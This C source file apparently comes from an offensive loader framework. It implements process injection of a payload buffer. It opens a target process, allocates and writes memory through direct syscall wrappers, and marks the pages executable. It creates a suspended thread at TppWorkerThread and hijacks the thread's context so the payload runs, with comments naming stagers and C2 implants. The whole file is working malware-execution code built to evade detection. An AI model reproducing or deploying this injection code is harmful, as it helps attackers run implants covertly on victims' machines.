#include <Ldr.h>
#include <Config.h>
#include <exec/Execute.h>
#include <core/SysNative.h>
#include <core/MiniStd.h>
#include <core/Win32.h>
#include <common/Defines.h>

#include <common/Debug.h>


BOOL
ExecutePayload(
    IN PBUFFER PayloadBuffer
) {
    HANDLE   ProcessHandle = NULL;
    NTSTATUS ExecStatus    = STATUS_UNSUCCESSFUL;

#if ( defined( EXEC_INJECT_REMOTE ) && ( EXEC_INJECT_REMOTE == TRUE ) )
    DWORD ProcessId = 0;

    if ( ! ProcessSearchId( H_TARGET_PROCESS, & ProcessId ) ) {
        PUTS( "[-] ProcessSearchId failed to find PID. Aborting ..." )
        goto LEAVE;
    }
    
    ProcessHandle = ProcessOpen( ProcessId, PROCESS_ALL_ACCESS );
    if ( ProcessHandle == INVALID_HANDLE_VALUE ) {
        PUTS( "[-] ProcessOpen failed to get ProcessHandle. Aborting ..." )
        goto LEAVE;
    }
#else
    ProcessHandle = NtCurrentProcess();
#endif // EXEC_INJECT_REMOTE == TRUE


#if ( defined( EXEC_INJECT_CRT ) && ( EXEC_INJECT_CRT == TRUE ) )
    PUTS( "[i] Executing Payload via ExecClassicInjection ..." )
    if ( ! NT_SUCCESS( ExecStatus = ExecClassicInjection( PayloadBuffer, ProcessHandle ) ) ) {
        PUTS( "[-] ExecClassicInjection failed. Aborting ..." )
        goto LEAVE;
    }
#endif // EXEC_INJECT_CRT == TRUE

LEAVE:
    return NT_SUCCESS( ExecStatus );
}


NTSTATUS
ExecClassicInjection(
    IN     PBUFFER PayloadBuffer,
    IN OPT HANDLE  ProcessHandle
) {
    NTSTATUS NtStatus         = STATUS_SUCCESS;
    PVOID    StartMemory      = NULL;
    SIZE_T   BytesWritten     = NULL;
    SIZE_T   RoundPayloadSize = PayloadBuffer->Length; // RoundPayloadSize will be overwritten with the allocated page size in NtAllocateVirtualMemory
    ULONG    OldProtection    = 0;
    HANDLE   ThreadHandle     = NULL;
    CONTEXT  ThreadContext    = { 0 };


    if ( ! NT_SUCCESS( NtStatus = SysNtAllocateVirtualMemory( 
        ProcessHandle, 
        & StartMemory, 
        0, 
        & RoundPayloadSize, 
        ( MEM_COMMIT | MEM_RESERVE ), 
        PAGE_READWRITE 
    ) ) ) {
        PRINTF( "[-] SysNtAllocateVirtualMemory failed. NtStatus: 0x%0.8X", NtStatus );
        return NtStatus;
    }
    PRINTF( "[+] Allocated Memory at Address : 0x%p of Size : %zu", StartMemory, PayloadBuffer->Length )
    PRINTF( "[i] Memory Page Size : %zu", RoundPayloadSize )


#if defined( EXEC_INJECT_REMOTE ) && ( EXEC_INJECT_REMOTE == TRUE )
    if ( ! NT_SUCCESS( NtStatus = SysNtWriteVirtualMemory( 
        ProcessHandle,
        StartMemory,
        PayloadBuffer->Buffer,
        PayloadBuffer->Length,
        & BytesWritten
    ) ) ) {
        PRINTF( "[-] SysNtWriteVirtualMemory failed. NtStatus: 0x%0.8X", NtStatus );
        return NtStatus;
    }
    PRINTF( "[+] Bytes Written : %zu of %zu", BytesWritten, PayloadBuffer->Length )
#else
    CopyMemoryEx( StartMemory, PayloadBuffer->Buffer, PayloadBuffer->Length );
#endif // EXEC_INJECT_REMOTE == TRUE


    if ( ! NT_SUCCESS( NtStatus = SysNtProtectVirtualMemory( 
        ProcessHandle, 
        & StartMemory, 
        & RoundPayloadSize, 
        ( PAGE_EXECUTE_READ ),
        & OldProtection    
    ) ) ) {
        PRINTF( "[-] SysNtProtectVirtualMemory failed. NtStatus: 0x%0.8X", NtStatus );
        return NtStatus;
    }
    PUTS( "[+] Changed Memory Page Protection to RX" )


    // maybe use some other func as tppworkerthread is initialized from km and not um
    PVOID ThreadStartRoutineAddr = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( TppWorkerThread ) );
    

    PRINTF( "[i] Creating Thread of Routine at Address : 0x%p ...", StartMemory )
    if ( ! NT_SUCCESS( NtStatus = SysNtCreateThreadEx(
        & ThreadHandle,
        ( THREAD_ALL_ACCESS ),
        NULL,
        ProcessHandle,
        ThreadStartRoutineAddr, // StartRoutine RtlUserThreadStart RCX
        NULL,                   // Argument     RtlUserThreadStart RDX
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        NULL,
        NULL,
        NULL,
        NULL
    ) ) ) {
        PRINTF( "[-] SysNtCreateThreadEx failed. NtStatus: 0x%0.8X", NtStatus )
        return NtStatus;
    }
    PRINTF( "[+] Created Thread with ThreadId : %d", Dbg->GetThreadId( ThreadHandle ) )


    ThreadContext.ContextFlags = CONTEXT_FULL;
    

    if ( ! NT_SUCCESS( NtStatus = SysNtGetContextThread(
        ThreadHandle,
        & ThreadContext
    ) ) ) {
        return NtStatus;
    }


    ThreadContext.Rcx = StartMemory; // Swap StartRoutine


    if ( ! NT_SUCCESS( NtStatus = SysNtSetContextThread(
        ThreadHandle,
        & ThreadContext
    ) ) ) {
        return NtStatus;
    }


    if ( ! NT_SUCCESS( NtStatus = SysNtResumeThread(
        ThreadHandle,
        NULL
    ) ) ) {
        return NtStatus;
    }
 
// NtWaitForSingleObject only makes sense if it's a local injection and the
// payload routine returns. Meaning it's required for a stager or calc,
// but not a c2 implant, as that doesn't return
#if ( ( defined( EXEC_INJECT_REMOTE ) && ( EXEC_INJECT_REMOTE == FALSE ) ) && \
      ( defined( DLL ) && ( DLL == FALSE ) )                               && \
      ( defined( XLL ) && ( XLL == FALSE ) )                                )
   PUTS( "[i] Waiting for Thread to execute Payload ..." )
    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject(
        ThreadHandle,
        FALSE,
        NULL
    ) ) ) {
        PRINTF( "[-] SysNtWaitForSingleObject failed. NtStatus: 0x%0.8X", NtStatus )
        return NtStatus;
    }
    PUTS( "[+] Thread Executed Payload" )
#endif

    return NtStatus;
}
